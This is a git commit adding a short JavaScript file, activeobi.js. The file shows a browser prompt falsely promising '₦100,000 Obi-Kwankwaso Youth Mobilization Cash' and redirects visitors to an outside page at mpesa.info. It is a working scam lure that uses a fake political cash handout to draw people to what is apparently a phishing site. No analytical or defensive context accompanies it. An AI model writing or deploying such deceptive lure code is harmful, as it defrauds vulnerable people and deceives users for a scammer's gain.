70e9c6a350530ae2ad62039e99e90bfc0c126407
mpessaa <34keeper_fusion@icloud.com>
2026-05-09 07:45:07 +0100

    Create activeobi.js

---
+++ activeobi.js
@@ -0,0 +1,11 @@
+
+var password = '₦100,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦100,000 Obi-Kwankwaso Youth Mobilization Cash. Click OK to activate now.',
+  '₦100,000'
+);
+
+if (password !== '₦100,000') {
+    location.href = 'https://mpesa.info/Obi-Kwankwaso-Youth-Funds.html';
+}
